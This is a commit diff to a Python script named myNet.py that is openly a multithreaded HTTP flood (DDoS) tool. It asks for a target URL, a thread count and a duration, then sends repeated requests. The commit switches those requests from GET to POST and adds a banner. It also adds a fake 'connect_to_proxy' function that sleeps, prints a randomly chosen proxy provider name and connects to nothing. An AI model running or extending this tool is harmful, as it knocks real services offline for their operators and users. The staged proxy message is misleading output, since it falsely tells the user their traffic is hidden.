7947e620065cb8b206800b61b7f755cf08036cfa
Lemonaidd <lemon.cookier@gmail.com>
2025-07-06 15:43:06 -0600

    Add files via upload

--- myNet.py
+++ myNet.py
@@ -22,6 +22,7 @@ COLOR_CODE = {
     "RESET": "\033[0m",
 }
 os.system("cls")
+print(Colorate.Horizontal(Colors.green_to_white, "Made by: Lemonaidd"))
 print(f'''{COLOR_CODE["GREEN"]} 
 
  ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
@@ -33,7 +34,16 @@ print(f'''{COLOR_CODE["GREEN"]}
 ░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
 ░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
        ░    ░ ░                 ░    ░  ░        
-            ░ ░                                  ''')                            
+            ░ ░                                  ''')  
+
+
+
+def connect_to_proxy():
+    print(Colorate.Horizontal(Colors.green_to_white, "Connecting to proxy..."))
+    time.sleep(2)
+    proxy_provider = random.choice(["Zyte", "Oxylabs", "Fineproxies", " IPRoyal", "WebShare","SOAX","PCMag","Proxyway","Netnut","Oculus Proxies","ayobyte","Smartproxies","toolip"])
+    print(f"{COLOR_CODE['GREEN']}Connected to {proxy_provider} !")
+              
 def ddos_attack():
     link = input(Colorate.Horizontal(Colors.green_to_white, "Target URL: "))
     num_threads = int(input(Colorate.Horizontal(Colors.green_to_white, "Threads: ")))
@@ -42,15 +52,16 @@ def ddos_attack():
     def send_request(session):
         while time.time() < end_time:
             try:
-                session.get(link)
+                session.post(link)
                 print(f"{COLOR_CODE['GREEN']} POST Request sent to: {link}{COLOR_CODE['RESET']}")
             except requests.RequestException:
                 print(f"{COLOR_CODE['RED']}ERROR ERROR ERROR {link}{COLOR_CODE['RESET']}")
-
+    
     end_time = time.time() + attack_duration
     threads = []
     session = requests.Session()
-
+    connect_to_proxy()
+    
     for _ in range(num_threads):
         thread = threading.Thread(target=send_request, args=(session,))
         threads.append(thread)
